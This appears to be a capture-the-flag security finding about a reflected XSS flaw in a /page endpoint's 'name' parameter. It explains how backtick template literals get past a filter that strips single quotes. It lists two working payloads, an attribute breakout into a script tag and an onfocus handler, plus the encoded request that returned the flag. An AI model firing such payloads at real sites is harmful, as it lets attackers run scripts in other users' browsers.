findings.title: Reflected XSS via 'name' parameter — single-quote filter bypass with backtick template literals
findings.description:
The /page endpoint reflects the 'name' GET parameter unsanitized into an HTML <input> value attribute. The application strips single quotes, but backtick (template literal) syntax is not filtered. By breaking out of the value attribute and injecting a <script> tag or autofocus/onfocus event handler using backtick-quoted strings, an attacker can execute arbitrary JavaScript.

Working payloads:
1. "><script>alert(`XSS`)</script>
2. " autofocus onfocus=alert(`XSS`) x="

The challenge server validated the XSS and returned the CTF flag.
findings.evidence:
GET /page?name=%22%3E%3Cscript%3Ealert(%60XSS%60)%3C%2Fscript%3E Response body contains: Congratulations!

Here is the flag: flag{150348df-0912-4c0b-b000-65a0a48bf14a} Reflected payload in HTML: ">
